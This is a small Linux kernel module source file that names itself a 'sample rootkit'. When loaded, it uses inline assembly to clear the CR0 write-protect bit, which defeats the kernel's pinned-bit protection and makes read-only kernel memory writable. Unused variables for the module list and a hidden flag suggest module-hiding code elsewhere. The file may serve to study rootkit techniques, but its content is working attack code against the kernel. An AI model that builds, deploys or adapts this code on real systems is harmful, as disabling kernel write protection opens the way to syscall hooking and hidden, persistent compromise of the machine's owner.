#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <asm/special_insns.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Krzysztof Zdulski");
MODULE_DESCRIPTION("Sample rootkit - pinned bits");
MODULE_VERSION("0.01");

struct list_head *module_list;
int is_hidden = 0;

static inline void _write_cr0(unsigned long val)
{
    asm volatile("mov %0,%%cr0" : "+r"(val) : : "memory");
}

static inline void _write_cr4(unsigned long val)
{
    asm volatile("mov %0,%%cr4" : "+r"(val) : : "memory");
}

static int __init lkm_example_init(void)
{
    printk(KERN_INFO "loading pinned bits module");
    _write_cr0(native_read_cr0() & (~0x10000));
    return 0;
}

static void __exit lkm_example_exit(void)
{
    printk(KERN_INFO "unloading pinned bits module");
}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
